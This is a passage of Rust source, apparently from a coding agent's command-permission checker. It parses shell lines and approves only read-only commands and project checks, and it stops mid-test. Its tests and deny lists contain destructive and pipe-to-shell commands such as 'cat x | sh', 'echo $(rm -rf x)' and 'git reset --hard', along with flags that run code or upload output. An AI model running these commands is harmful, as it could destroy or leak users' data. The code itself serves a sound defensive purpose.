/// Whether `command` keeps its exact words on Windows: one [`WINDOWS_RISKY`]
/// names, a cmdlet such as `remove-item`, whose verb picks what it does, or a
/// script, which runs whatever it holds.
fn windows_risky(command: &str) -> bool {
    let script = [".cmd", ".bat", ".ps1", ".vbs", ".js", ".wsf", ".com"]
        .iter()
        .any(|end| command.ends_with(end));
    WINDOWS_RISKY.contains(&command) || command.contains('-') || script
}

/// Whether a tool's subcommand runs whatever it's given. A package manager's
/// `run` isn't one, as it runs a script the project named.
fn runs_what_it_names(command: &str, sub: &str) -> bool {
    matches!(
        (command, sub),
        (
            "cargo" | "go" | "uv" | "poetry" | "deno" | "swift" | "dotnet" | "mix" | "rustup",
            "run"
        ) | ("uv", "pip" | "tool")
            | ("deno", "eval")
            | ("go", "generate" | "tool")
            | ("npm", "config" | "ci")
    )
}

/// Whether a git command rewrites, throws away or pushes work, or reads
/// options its words don't show.
fn git_risky(part: &Part) -> bool {
    let rest = after_globals(part);
    let Some(sub) = rest.first() else {
        return false;
    };
    if sub.starts_with('-') || GIT_RISKY.contains(&sub.as_str()) {
        return true;
    }
    // What these do turns on their flags, so only their listing forms
    // are kept loose.
    match sub.as_str() {
        "branch" | "tag" | "remote" | "stash" | "config" => !git_reads(rest),
        // A reading one that writes a file or opens a pager.
        sub if GIT_READERS.contains(&sub) => !reads_only(part),
        _ => false,
    }
}

/// Whether `part` only reads, which is all Auto runs without a rule.
fn reads_only(part: &Part) -> bool {
    let Some(command) = part.first().map(String::as_str) else {
        return false;
    };
    let args = &part[1..];
    match command {
        // `-files0-from` reads where to look from another file.
        "find" => !args.iter().any(|arg| {
            matches!(
                arg.as_str(),
                "-exec" | "-execdir" | "-ok" | "-okdir" | "-delete" | "-files0-from"
            ) || arg.starts_with("-fprint")
                || arg.starts_with("-fls")
        }),
        "sed" => sed_reads(args),
        "git" => {
            let rest = after_globals(part);
            let denied = rest.iter().any(|arg| names_flag(arg, GIT_DENIED));
            !denied && git_reads(rest)
        }
        "cargo" => !loads_code(command, args) && cargo_checks(after_globals(part)),
        "go" => {
            !loads_code(command, args)
                && args
                    .first()
                    .is_some_and(|sub| matches!(sub.as_str(), "build" | "test" | "vet"))
        }
        "pytest" => !loads_code(command, args),
        "tsc" => args.iter().any(|arg| arg == "--noEmit"),
        "npm" | "pnpm" | "yarn" | "bun" => {
            !loads_code(command, args) && script_checks(after_globals(part))
        }
        _ => READERS.contains(&command) && !reader_writes(command, args),
    }
}

/// Whether one of the reading commands is asked, through its arguments, to
/// write a file, run another command or read more than its words show: a
/// flag its table doesn't list, or one of the uses below.
fn reader_writes(command: &str, args: &[String]) -> bool {
    let Some(options) = options_for(command) else {
        // `printf -v` sets a shell variable, such as `PATH`.
        return command == "printf" && args.iter().any(|arg| names_flag(arg, &["-v"]));
    };
    let Some(parsed) = parse(options, args) else {
        return true;
    };
    match command {
        // A second file names where `uniq` writes.
        "uniq" => parsed.plain.len() > 1,
        // A `date` without a `+format` sets the clock.
        "date" => parsed.plain.iter().any(|word| !word.starts_with('+')),
        "jq" => parsed.term.is_some_and(|program| !jq_reads(program)),
        _ => false,
    }
}

/// Whether `arg` names one of the `denied` flags the way option parsers read
/// them: a long flag by any shorter form of its name, with or without a
/// value, and a short flag anywhere in a run of them, such as `-ro`.
fn names_flag(arg: &str, denied: &[&str]) -> bool {
    if let Some(long) = arg.strip_prefix("--") {
        let name = long.split('=').next().unwrap_or(long);
        return !name.is_empty()
            && denied
                .iter()
                .filter_map(|flag| flag.strip_prefix("--"))
                .any(|flag| flag.starts_with(name));
    }
    let Some(short) = arg.strip_prefix('-') else {
        return false;
    };
    denied
        .iter()
        .filter(|flag| !flag.starts_with("--"))
        .filter_map(|flag| flag.strip_prefix('-'))
        .any(|letter| short.contains(letter))
}

/// Whether a project's check is told, through a flag, to load or run
/// something besides the project's own code. A rule for the check doesn't
/// cover these.
fn loads_code(command: &str, args: &[String]) -> bool {
    const SCRIPT_FLAGS: &[&str] = &[
        "--script-shell",
        "--node-options",
        "--userconfig",
        "--globalconfig",
        "--use-yarnrc",
        "--preload",
        "--config",
    ];
    let any = |flags: &[&str]| args.iter().any(|arg| names_flag(arg, flags));
    match command {
        "cargo" => any(&["--config"]),
        // A variable on make's line can name the shell or any tool its recipes
        // run, and these read another makefile or more of one.
        "make" => {
            args.iter().any(|arg| arg.contains('='))
                || any(&["-f", "--file", "--makefile", "--eval"])
        }
        // Go reads `-name` and `--name` the same, and has no short flags.
        "go" => args.iter().any(|arg| {
            let name = arg.trim_start_matches('-').split('=').next();
            arg.starts_with('-')
                && name.is_some_and(|name| {
                    matches!(
                        name,
                        "exec" | "toolexec" | "vettool" | "ldflags" | "overlay" | "modfile"
                    )
                })
        }),
        // `--basetemp` empties the folder it names, and `--pastebin` sends
        // the output away.
        "pytest" => any(&[
            "-p",
            "-c",
            "-o",
            "--config-file",
            "--override-ini",
            "--pastebin",
            "--basetemp",
        ]),
        "npm" | "pnpm" | "yarn" | "bun" => {
            any(SCRIPT_FLAGS)
                || args.iter().any(|arg| arg.starts_with("--config"))
                || (command == "bun" && any(&["-r"]))
        }
        _ => false,
    }
}

/// Whether a git command, from its subcommand on, only reads.
fn git_reads(rest: &[String]) -> bool {
    let Some(sub) = rest.first() else {
        return false;
    };
    let args = &rest[1..];
    match sub.as_str() {
        "branch" => listing(
            args,
            &[
                "--list",
                "-l",
                "-a",
                "--all",
                "-r",
                "--remotes",
                "-v",
                "-vv",
                "--verbose",
                "--show-current",
            ],
            &["--contains", "--merged"],
            false,
        ),
        "tag" => {
            let lists = args.iter().any(|arg| arg == "-l" || arg == "--list");
            listing(args, &["-l", "--list"], &[], lists)
        }
        "remote" => match args.first().map(String::as_str) {
            None | Some("-v" | "--verbose") => args.len() <= 1,
            Some("get-url") => args.len() == 2,
            Some(_) => false,
        },
        "stash" => args.first().is_some_and(|arg| arg == "list"),
        // The user's and the system's settings can hold tokens, so only the
        // repository's own are read.
        "config" => {
            let gets = args.iter().any(|arg| arg == "--get");
            let lists = args.iter().any(|arg| arg == "--list" || arg == "-l");
            let local = args.iter().any(|arg| arg == "--local");
            let flags = ["--get", "--list", "-l", "--local"];
            let positional = args.iter().filter(|arg| !arg.starts_with('-')).count();
            let flags_ok = args
                .iter()
                .filter(|arg| arg.starts_with('-'))
                .all(|arg| flags.contains(&arg.as_str()));
            local
                && flags_ok
                && ((gets && (1..=2).contains(&positional)) || (lists && positional == 0))
        }
        sub => GIT_READERS.contains(&sub),
    }
}

/// Whether `args` hold only the listing `flags`, the values of the
/// `with_value` flags, and other words only when `free` says so.
fn listing(args: &[String], flags: &[&str], with_value: &[&str], free: bool) -> bool {
    let mut after_value_flag = false;
    for arg in args {
        let ok = if arg.starts_with('-') {
            flags.contains(&arg.as_str()) || with_value.contains(&arg.as_str())
        } else {
            free || after_value_flag
        };
        if !ok {
            return false;
        }
        after_value_flag = with_value.contains(&arg.as_str());
    }
    true
}

/// Whether a sed command only prints: only flags known to change nothing,
/// and a script that only prints. A flag it doesn't know counts as writing.
fn sed_reads(args: &[String]) -> bool {
    sed_words(args)
        .is_some_and(|(scripts, _)| scripts.iter().all(|script| sed_script_reads(script)))
}

/// A sed command's scripts and files, or none when it has a flag not known to
/// change nothing. Its first plain word is a script only when no flag gives one.
fn sed_words(args: &[String]) -> Option<(Vec<&str>, Vec<&str>)> {
    let mut scripts: Vec<&str> = Vec::new();
    let mut plain: Vec<&str> = Vec::new();
    let mut next_is_script = false;
    for arg in args {
        if next_is_script {
            scripts.push(arg);
            next_is_script = false;
            continue;
        }
        match arg.as_str() {
            "--expression" => next_is_script = true,
            arg if arg.starts_with("--expression=") => {
                scripts.push(&arg["--expression=".len()..]);
            }
            arg if arg.starts_with("--") => {
                if !SED_LONG.contains(&arg) {
                    return None;
                }
            }
            // Short flags run together, such as `-nE`. An `e` takes the next
            // word as its script only when it comes last, and anything after
            // it would be a script this can't see apart from the flags.
            arg if arg.starts_with('-') && arg.len() > 1 => {
                let letters = &arg[1..];
                let plain = letters.strip_suffix('e');
                next_is_script = plain.is_some();
                if !plain
                    .unwrap_or(letters)
                    .chars()
                    .all(|c| "nErsuz".contains(c))
                {
                    return None;
                }
            }
            arg => plain.push(arg),
        }
    }
    if scripts.is_empty() && !plain.is_empty() {
        scripts.push(plain.remove(0));
    }
    Some((scripts, plain))
}

/// Whether a sed script holds only commands that print or move through the
/// input, and no `w` or `e` flag on an `s` command. It errs on the safe side:
/// outside a `/regex/` address, a label and an `s` or `y` command's own text,
/// any letter it doesn't know counts as writing.
fn sed_script_reads(script: &str) -> bool {
    let chars: Vec<char> = script.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '/' {
            // An address: skip to its closing slash. One that doesn't close
            // could run on into the next `-e` script.
            let mut j = i + 1;
            while j < chars.len() && chars[j] != '/' {
                j += if chars[j] == '\\' { 2 } else { 1 };
            }
            if j >= chars.len() {
                return false;
            }
            i = j + 1;
            continue;
        }
        if matches!(c, ':' | 'b' | 't' | 'T') {
            // A label runs to the next `;` and can spell any command's letter.
            let mut j = i + 1;
            while j < chars.len() && !matches!(chars[j], ';' | '\n') {
                j += 1;
            }
            i = j;
            continue;
        }
        if c == 'y' && i + 1 < chars.len() {
            // Its two lists, and it takes no flags.
            let delim = chars[i + 1];
            if matches!(delim, '\\' | '\n') {
                return false;
            }
            let mut seen = 0;
            let mut j = i + 2;
            while j < chars.len() && seen < 2 {
                if chars[j] == '\\' {
                    j += 2;
                    continue;
                }
                if chars[j] == delim {
                    seen += 1;
                }
                j += 1;
            }
            if seen < 2 {
                return false;
            }
            i = j;
            continue;
        }
        if c == 's' && i + 1 < chars.len() {
            // Skip the pattern and the replacement, then read the flags.
            let delim = chars[i + 1];
            if matches!(delim, '\\' | '\n') {
                return false;
            }
            let mut seen = 0;
            let mut j = i + 2;
            while j < chars.len() && seen < 2 {
                if chars[j] == '\\' {
                    j += 2;
                    continue;
                }
                if chars[j] == delim {
                    seen += 1;
                }
                j += 1;
            }
            if seen < 2 {
                return false;
            }
            while j < chars.len() && !matches!(chars[j], ';' | '\n' | '}') {
                if matches!(chars[j], 'w' | 'W' | 'e') {
                    return false;
                }
                j += 1;
            }
            i = j;
            continue;
        }
        if !c.is_ascii_digit() && !" \t\n;,!{}$~+IMpPdqQnNDgGhHx=lzF".contains(c) {
            return false;
        }
        i += 1;
    }
    true
}

/// Whether a cargo command, after its toolchain, is a check that changes
/// nothing but the build folder.
fn cargo_checks(rest: &[String]) -> bool {
    let Some(sub) = rest.first() else {
        return false;
    };
    let args = &rest[1..];
    let fixes = args
        .iter()
        .any(|arg| arg == "--fix" || arg == "--allow-dirty");
    match sub.as_str() {
        "check" | "build" | "test" | "clippy" => !fixes,
        "nextest" => args.first().is_some_and(|arg| arg == "run"),
        "fmt" => args.iter().any(|arg| arg == "--check"),
        _ => false,
    }
}

/// Whether a package manager's command runs the project's tests or a
/// check script.
fn script_checks(rest: &[String]) -> bool {
    match rest.first().map(String::as_str) {
        Some("test") => true,
        Some("run") => rest.get(1).is_some_and(|script| {
            [
                "test",
                "lint",
                "typecheck",
                "check",
                "build",
                "format:check",
            ]
            .iter()
            .any(|start| script.starts_with(start))
        }),
        _ => false,
    }
}

/// `words` as one command line, each word quoted when the shell would
/// read it otherwise.
fn join(words: &[String]) -> String {
    words
        .iter()
        .map(|word| quote(word))
        .collect::<Vec<_>>()
        .join(" ")
}

/// One word as the shell reads it back.
fn quote(word: &str) -> String {
    let plain = !word.is_empty()
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "_@%+=:,./-".contains(c));
    if plain {
        word.to_owned()
    } else {
        format!("'{}'", word.replace('\'', r"'\''"))
    }
}

/// Splits a command line into its commands, each as its words with the
/// quotes taken off, or says why it's always asked about.
pub fn split(line: &str) -> Result<Vec<Part>, Refusal> {
    Ok(read(line, Syntax::HOST)?
        .into_iter()
        .map(|command| command.words)
        .collect())
}

/// Reads a command line into its commands, as `syntax`'s shell reads it, or
/// says why it's always asked about.
fn read(line: &str, syntax: Syntax) -> Result<Vec<Command>, Refusal> {
    let line = match syntax {
        Syntax::Sh => line.to_owned(),
        Syntax::Windows => windows_line(line)?,
    };
    let mut lexer = Lexer {
        chars: line.chars().collect(),
        at: 0,
        globbed: false,
    };
    let mut parts: Vec<Command> = Vec::new();
    let mut part = Command {
        words: Vec::new(),
        globs: Vec::new(),
    };
    loop {
        match lexer.token()? {
            Token::Word(word) => {
                if lexer.globbed {
                    part.globs.push(part.words.len());
                }
                part.words.push(word);
            }
            Token::Redirect(target) => {
                // Windows has no `/dev/null`, so a redirection there makes a file.
                let to_file = match syntax {
                    Syntax::Sh => target.is_some_and(|target| target != "/dev/null"),
                    Syntax::Windows => target.is_some(),
                };
                if to_file {
                    return Err(Refusal::Output);
                }
            }
            Token::Break => {
                if !part.words.is_empty() {
                    parts.push(Command {
                        words: std::mem::take(&mut part.words),
                        globs: std::mem::take(&mut part.globs),
                    });
                }
            }
            Token::End => {
                if !part.words.is_empty() {
                    parts.push(part);
                }
                break;
            }
        }
    }
    if parts.is_empty() {
        return Err(Refusal::Empty);
    }
    for part in &mut parts {
        if syntax == Syntax::Windows {
            program_as_named(&mut part.words[0]);
        }
        let first = &part.words[0];
        if matches!(first.as_str(), "sudo" | "su" | "doas" | "runas" | "gsudo") {
            return Err(Refusal::OtherUser);
        }
        if is_assignment(first) {
            return Err(Refusal::Assignment);
        }
    }
    Ok(parts)
}

/// A line PowerShell or `cmd.exe` runs as sh would read it: each `\` a `/`,
/// which both take as a folder separator. Refused when either would expand
/// or escape something sh doesn't: a backtick, `^`, `%` or `@`, a quote
/// doubled inside quotes, or a `\` before a quote, which a program's own
/// argument reading takes as an escaped quote. So is a `[` or `]`, and a
/// `*`, `?`, `{` or `}` in quotes, since PowerShell's file commands and the
/// programs Git for Windows brings match names with them even when quoted.
fn windows_line(line: &str) -> Result<String, Refusal> {
    if line.contains(['`', '^', '%', '@', '[', ']']) {
        return Err(Refusal::Expansion);
    }
    if line.contains("''") || line.contains("\"\"") || line.contains("\\\"") {
        return Err(Refusal::Expansion);
    }
    let mut quote = None;
    for c in line.chars() {
        match (quote, c) {
            (None, '\'' | '"') => quote = Some(c),
            (Some(open), c) if c == open => quote = None,
            (Some(_), '*' | '?' | '{' | '}') => return Err(Refusal::Expansion),
            _ => {}
        }
    }
    Ok(line.replace('\\', "/"))
}

/// A program's name as Windows finds it: `git.exe` is `git`.
fn program_as_named(program: &mut String) {
    if !program.contains('/') && program.len() > 4 && program.ends_with(".exe") {
        program.truncate(program.len() - 4);
    }
}

/// Whether a command's first word sets a variable, as `NAME=value`.
fn is_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    chars
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// What the lexer read next.
enum Token {
    /// A word with its quotes taken off.
    Word(String),
    /// A redirection, with the file it writes to, or none for one onto
    /// another descriptor.
    Redirect(Option<String>),
    /// `&&`, `||`, `;`, `|`, `|&` or a newline.
    Break,
    /// The end of the line.
    End,
}

/// Reads a command line a token at a time.
struct Lexer {
    chars: Vec<char>,
    at: usize,
    /// Whether the last word read has an unquoted `*` or `?`.
    globbed: bool,
}

impl Lexer {
    fn peek(&self, ahead: usize) -> Option<char> {
        self.chars.get(self.at + ahead).copied()
    }

    fn token(&mut self) -> Result<Token, Refusal> {
        while let Some(c) = self.peek(0) {
            match c {
                ' ' | '\t' => self.at += 1,
                '\\' if self.peek(1) == Some('\n') => self.at += 2,
                '#' => {
                    while self.peek(0).is_some_and(|c| c != '\n') {
                        self.at += 1;
                    }
                }
                _ => break,
            }
        }
        let Some(c) = self.peek(0) else {
            return Ok(Token::End);
        };
        match c {
            '\n' | ';' => {
                self.at += 1;
                Ok(Token::Break)
            }
            '|' => {
                self.at += if matches!(self.peek(1), Some('|' | '&')) {
                    2
                } else {
                    1
                };
                Ok(Token::Break)
            }
            '&' => match self.peek(1) {
                Some('&') => {
                    self.at += 2;
                    Ok(Token::Break)
                }
                Some('>') => {
                    self.at += 1;
                    self.redirect()
                }
                _ => Err(Refusal::Grouping),
            },
            '<' => Err(Refusal::Input),
            '>' => self.redirect(),
            '(' | ')' => Err(Refusal::Grouping),
            _ => {
                let word = self.word()?;
                // A descriptor number right before `>` belongs to it.
                if self.peek(0) == Some('>') && word.chars().all(|c| c.is_ascii_digit()) {
                    return self.redirect();
                }
                Ok(Token::Word(word))
            }
        }
    }

    /// Reads a redirection from its `>`.
    fn redirect(&mut self) -> Result<Token, Refusal> {
        self.at += 1;
        if matches!(self.peek(0), Some('>' | '|')) {
            self.at += 1;
        }
        if self.peek(0) == Some('(') {
            return Err(Refusal::Substitution);
        }
        if self.peek(0) == Some('&') {
            self.at += 1;
            let mut fd = String::new();
            while let Some(c) = self.peek(0).filter(char::is_ascii_digit) {
                fd.push(c);
                self.at += 1;
            }
            let ends = self
                .peek(0)
                .is_none_or(|c| matches!(c, ' ' | '\t' | '\n' | ';' | '|' | '&'));
            return if fd.is_empty() || !ends {
                Err(Refusal::Output)
            } else {
                Ok(Token::Redirect(None))
            };
        }
        while matches!(self.peek(0), Some(' ' | '\t')) {
            self.at += 1;
        }
        match self.peek(0) {
            None | Some('\n' | ';' | '|' | '&' | '<' | '>' | '(' | ')') => Err(Refusal::Output),
            Some(_) => Ok(Token::Redirect(Some(self.word()?))),
        }
    }

    /// Reads one word up to an unquoted space or operator.
    fn word(&mut self) -> Result<String, Refusal> {
        let mut word = String::new();
        self.globbed = false;
        while let Some(c) = self.peek(0) {
            match c {
                ' ' | '\t' | '\n' | ';' | '|' | '&' | '<' | '>' | '(' | ')' => break,
                '`' => return Err(Refusal::Substitution),
                '$' if self.peek(1) == Some('(') => return Err(Refusal::Substitution),
                '$' | '{' | '}' | '[' => return Err(Refusal::Expansion),
                '*' | '?' => {
                    self.globbed = true;
                    word.push(c);
                    self.at += 1;
                }
                '\\' => {
                    match self.peek(1) {
                        Some('\n') => {}
                        Some(next) => word.push(next),
                        None => return Err(Refusal::Unclosed),
                    }
                    self.at += 2;
                }
                '\'' => {
                    self.at += 1;
                    loop {
                        match self.peek(0) {
                            None => return Err(Refusal::Unclosed),
                            Some('\'') => break,
                            Some(c) => word.push(c),
                        }
                        self.at += 1;
                    }
                    self.at += 1;
                }
                '"' => {
                    self.at += 1;
                    loop {
                        match self.peek(0) {
                            None => return Err(Refusal::Unclosed),
                            Some('"') => break,
                            Some('`') => return Err(Refusal::Substitution),
                            Some('$') if self.peek(1) == Some('(') => {
                                return Err(Refusal::Substitution);
                            }
                            // No shell expands a `$` right before the closing
                            // quote, or `{`, `}` and `[` anywhere inside these.
                            Some('$') if self.peek(1) != Some('"') => {
                                return Err(Refusal::Expansion);
                            }
                            Some('\\')
                                if matches!(self.peek(1), Some('"' | '\\' | '$' | '`' | '\n')) =>
                            {
                                if let Some(next) = self.peek(1).filter(|c| *c != '\n') {
                                    word.push(next);
                                }
                                self.at += 1;
                            }
                            Some(c) => word.push(c),
                        }
                        self.at += 1;
                    }
                    self.at += 1;
                }
                c => {
                    word.push(c);
                    self.at += 1;
                }
            }
        }
        Ok(word)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The folders, read as sh reads a line on every system.
    fn folders() -> Folders {
        Folders::new(Path::new("/work/ws"), Path::new("/data/attached"), false)
    }

    #[test]
    fn a_place_elsewhere_reads_lines_as_sh_does() {
        assert_eq!(folders().syntax, Syntax::Sh);
        let here = Folders::new(Path::new("/work/ws"), Path::new("/data/attached"), true);
        assert_eq!(here.syntax, Syntax::HOST);
    }

    /// [`super::split`] as sh reads a line.
    fn split(line: &str) -> Result<Vec<Part>, Refusal> {
        Ok(read(line, Syntax::Sh)?
            .into_iter()
            .map(|command| command.words)
            .collect())
    }

    fn allows(line: &str, auto: bool, rules: &[CommandRule]) -> bool {
        super::allows(line, auto, rules, &folders())
    }

    fn rules_for(line: &str) -> Vec<CommandRule> {
        super::rules_for(line, &folders())
    }

    fn auto(line: &str) -> bool {
        allows(line, true, &[])
    }

    fn rule(command: &str, exact: bool) -> CommandRule {
        CommandRule {
            command: command.to_owned(),
            exact,
        }
    }

    fn words(line: &str) -> Vec<Vec<String>> {
        split(line).unwrap()
    }

    #[test]
    fn quotes_keep_operators_inside_one_word() {
        assert_eq!(
            words(r#"grep -n "a && b; c | d" src"#),
            [["grep", "-n", "a && b; c | d", "src"]]
        );
        assert_eq!(words("echo 'x || y'"), [["echo", "x || y"]]);
        assert_eq!(
            words(r#"echo "it's" 'say "hi"'"#),
            [["echo", "it's", "say \"hi\""]]
        );
        assert_eq!(words(r"echo a\ b \;"), [["echo", "a b", ";"]]);
        assert_eq!(
            words(r#"echo "a \"q\" \$HOME""#),
            [["echo", "a \"q\" $HOME"]]
        );
        assert!(auto("rg 'rm -rf; curl x | sh' src"));
    }

    #[test]
    fn chains_split_and_every_part_has_to_pass() {
        assert_eq!(
            words("ls -la && echo hi; pwd || cat x | wc -l\ngit status |& head"),
            vec![
                vec!["ls", "-la"],
                vec!["echo", "hi"],
                vec!["pwd"],
                vec!["cat", "x"],
                vec!["wc", "-l"],
                vec!["git", "status"],
                vec!["head"],
            ]
        );
        assert!(auto("ls -la && echo hi"));
        assert!(auto("git log --oneline | head -5"));
        assert!(!auto("ls && rm -rf build"));
        assert!(!auto("cat x | sh"));
        assert!(!auto("echo hi; curl example.com"));
    }

    #[test]
    fn hidden_commands_are_always_asked_about() {
        for (line, why) in [
            ("echo $(rm -rf x)", Refusal::Substitution),
            ("echo \"$(whoami)\"", Refusal::Substitution),
            ("echo `whoami`", Refusal::Substitution),
            ("echo \"`whoami`\"", Refusal::Substitution),
            ("diff <(ls a) <(ls b)", Refusal::Input),
            ("cat <<EOF\nhi\nEOF", Refusal::Input),
            ("wc -l < file", Refusal::Input),
            ("ls >(cat)", Refusal::Substitution),
            ("sudo ls", Refusal::OtherUser),
            ("ls && su root", Refusal::OtherUser),
            ("FOO=1 ls", Refusal::Assignment),
            ("ls; PATH=/tmp:$PATH git status", Refusal::Expansion),
            ("echo hi > out.txt", Refusal::Output),
            ("echo hi >> out.txt", Refusal::Output),
            ("ls 2> errors.log", Refusal::Output),
            ("ls &> all.log", Refusal::Output),
            ("ls >", Refusal::Output),
            ("(cd x && ls)", Refusal::Grouping),
            ("sleep 10 &", Refusal::Grouping),
            ("echo 'open", Refusal::Unclosed),
            ("echo \"open", Refusal::Unclosed),
            ("  ;; ", Refusal::Empty),
        ] {
            assert_eq!(split(line), Err(why), "{line}");
            assert!(!auto(line), "{line}");
            assert!(!allows(line, false, &[rule("ls", false)]), "{line}");
        }
        assert_eq!(split("echo hi > out.txt"), Err(Refusal::Output));
    }

    #[test]
    fn only_null_and_descriptor_redirections_pass() {
        assert!(auto("cargo test 2>&1 | tail -20"));
        assert!(auto("ls missing 2>/dev/null"));
        assert!(auto("ls missing 2> /dev/null || echo none"));
        assert!(auto("grep -r x . >/dev/null 2>&1"));
        assert!(auto("ls &>/dev/null"));
        assert!(auto("echo oops >&2"));
        assert!(!auto("echo hi >&file"));
        assert!(!auto("echo hi >/dev/nullx"));
        // Quoted, `>` is just a character.
        assert!(auto("grep '>' notes.md"));
    }

    #[test]
    fn readers_pass_in_auto_and_others_ask() {
        for line in [
            "ls -la",
            "pwd",
            "cat README.md",
            "head -n 5 a b",
            "tree -L 2",
            "jq .name package.json",
            "rg -n 'fn main' crates",
            "echo hi",
            "cd crates && ls",
            "wc -l src/*.rs",
            "stat -f %z file",
        ] {
            assert!(auto(line), "{line}");
            assert!(!allows(line, false, &[]), "{line} outside Auto");
        }
        for line in [
            "awk '{print $1}' f",
            "xargs rm",
            "env",
            "sh -c 'ls'",
            "bash -c ls",
            "touch x",
            "mkdir y",
            "python3 -c 'print(1)'",
            "/bin/ls",
            "./run.sh",
        ] {
            assert!(!auto(line), "{line}");
        }
    }

    #[test]
    fn readers_that_would_write_or_run_something_ask() {
        for line in [
            "sort -o out.txt in.txt",
            "sort -ro out in",
            "sort --output=out in",
            "tree -o out.txt",
            "uniq in.txt out.txt",
            "rg --pre ./script x",
            "rg --pre=./script x",
            "fd -x rm",
            "fd . --exec-batch rm",
            "date -s 12:00",
            "git grep -Ovim x",
            "git grep --open-files-in-pager=vim x",
        ] {
            assert!(!auto(line), "{line}");
            assert!(rules_for(line).iter().all(|rule| rule.exact), "{line}");
        }
        assert!(auto("sort -r -u in.txt"));
        assert!(auto("uniq -c in.txt"));
        assert!(auto("rg --pretty x"));
        assert!(auto("fd -e rs"));
        assert!(auto("date -u"));
    }

    #[test]
    fn find_and_sed_pass_only_when_they_read() {
        assert!(auto("find . -name '*.rs' -type f"));
        for flag in [
            "-exec rm {} ;",
            "-execdir ls ;",
            "-ok rm {} ;",
            "-delete",
            "-fprint out",
        ] {
            assert!(!auto(&format!("find . -name x {flag}")), "{flag}");
        }
        assert!(auto("sed -n '1,20p' file.rs"));
        assert!(auto("sed -n -e 's/a/b/g' -e '3p' f"));
        assert!(auto("sed 's|x|y|' f"));
        assert!(auto("sed -n '/error/p' log.txt"));
        assert!(auto("sed -n '/^fn /,/^}/p' a.rs"));
        assert!(auto("sed 'y/abc/xyz/' f"));
        assert!(!auto("sed '/x/w out' f"));
        assert!(!auto("sed '/x/e' f"));
        assert!(!auto("sed -i 's/a/b/' f"));
        assert!(!auto("sed -i.bak 's/a/b/' f"));
        assert!(!auto("sed --in-place 's/a/b/' f"));
        assert!(!auto("sed -ni 's/a/b/p' f"));
        assert!(!auto("sed 's/a/b/w out' f"));
        assert!(!auto("sed 's/a/b/e' f"));
        assert!(!auto("sed '1w out' f"));
        assert!(!auto("sed -e '$e date' f"));
        assert!(!auto("sed -f script.sed f"));
    }

    #[test]
    fn git_passes_only_what_reads() {
        for line in [
            "git status",
            "git log --oneline -5",
            "git diff HEAD~1 -- src",
            "git show 1a2b3c",
            "git -C sub show HEAD",
            "git --no-pager log -1",
            "git blame -L 1,9 a.rs",
            "git rev-parse HEAD",
            "git ls-files",
            "git for-each-ref refs/heads",
            "git branch",
            "git branch -a -vv",
            "git branch --contains 1a2b3c",
            "git branch --show-current",
            "git remote -v",
            "git remote",
            "git remote get-url origin",
            "git tag",
            "git tag -l 'v1.*'",
            "git stash list",
            "git config --local --get user.email",
            "git config --local --list",
        ] {
            assert!(auto(line), "{line}");
        }
        for line in [
            "git push",
            "git commit -m x",
            "git add .",
            "git branch -D old",
            "git branch new",
            "git remote add up example.com",
            "git remote set-url origin x",
            "git tag v2",
            "git tag -d v1",
            "git stash",
            "git stash drop",
            "git config user.name x",
            "git config --get user.email",
            "git config --list",
            "git config --global --get user.name",
            "git config --local --get",
            "git -c core.pager=x log",
            "git log --output=out.txt",
            "git diff --output out.txt",
            "git reset --hard",
            "git checkout .",
            "git",
        ] {
            assert!(!auto(line), "{line}");
        }
    }

    #[test]
    fn project_checks_pass_but_installs_and_runs_do_not() {
        for line in [
            "cargo check",
            "cargo +1.99.0 clippy --workspace --all-targets -- -D warnings",
            "cargo test -p maxd cursor",
            "cargo build --release",
            "cargo nextest run",
            "cargo fmt --all --check",
            "go test ./...",
            "go vet ./...",
            "pytest -q",
            "tsc --noEmit -p .",
            "pnpm test",
            "npm test",
            "yarn test",
            "bun test",
            "pnpm run typecheck",
            "pnpm run lint:fix",
            "npm run build",
            "pnpm run test:desktop",
            "pnpm run format:check",
            "pnpm --filter desktop test",
            "pnpm -C apps/desktop run lint",
        ] {
            assert!(auto(line), "{line}");
        }
        for line in [
            "cargo fmt",
            "cargo clippy --fix",
            "cargo install ripgrep",
            "cargo publish",
            "cargo run",
            "go run .",
            "go get x",
            "tsc",
            "pnpm install",
            "pnpm add left-pad",
            "npm publish",
            "pnpm exec vite",
            "pnpm dlx create-x",
            "npm run deploy",
            "pnpm run format",
            "npx tsc --noEmit",
        ] {
            assert!(!auto(line), "{line}");
        }
    }

    #[test]
    fn rules_keep_the_command_and_its_subcommand() {
        let one = |line: &str| rules_for(line);
        assert_eq!(one("git show 1a2b3c"), [rule("git show", false)]);
        assert_eq!(
            one("git -C sub --no-pager log -1"),
            [rule("git log", false)]
        );
        assert_eq!(one("cargo test -p maxd"), [rule("cargo test", false)]);
        assert_eq!(one("cargo +nightly miri test"), [rule("cargo miri", false)]);
        assert_eq!(one("ls -la"), [rule("ls", false)]);
        assert_eq!(one("make clean"), [rule("make clean", false)]);
        assert_eq!(
            one("pnpm run dev --port 3000"),
            [rule("pnpm run dev", false)]
        );
        assert_eq!(one("pnpm --filter desktop dev"), [rule("pnpm dev", false)]);
        assert_eq!(one("gh pr view 12"), [rule("gh pr view", false)]);
        assert_eq!(one("git commit -m 'fix it'"), [rule("git commit", false)]);
        assert_eq!(
            one("cd app && git add a && git commit -m x"),
            [rule("git add", false), rule("git commit", false)]
        );
        assert_eq!(one("ls && ls -l"), [rule("ls", false)]);
        // A line that's always asked about saves nothing.
        assert!(one("echo $(id)").is_empty());
        assert!(one("echo hi > f").is_empty());
    }

    #[test]
    fn risky_commands_keep_their_exact_words() {
        let one = |line: &str| rules_for(line);
        assert_eq!(one("rm -rf build"), [rule("rm -rf build", true)]);
        assert_eq!(
            one("curl -sI 'https://example.com/a b'"),
            [rule("curl -sI 'https://example.com/a b'", true)]
        );
        assert_eq!(
            one("git push origin main"),
            [rule("git push origin main", true)]
        );
        assert_eq!(one("git branch -D old"), [rule("git branch -D old", true)]);
        assert_eq!(one("git tag -d v1"), [rule("git tag -d v1", true)]);
        assert_eq!(one("git -c a=b log"), [rule("git -c a=b log", true)]);
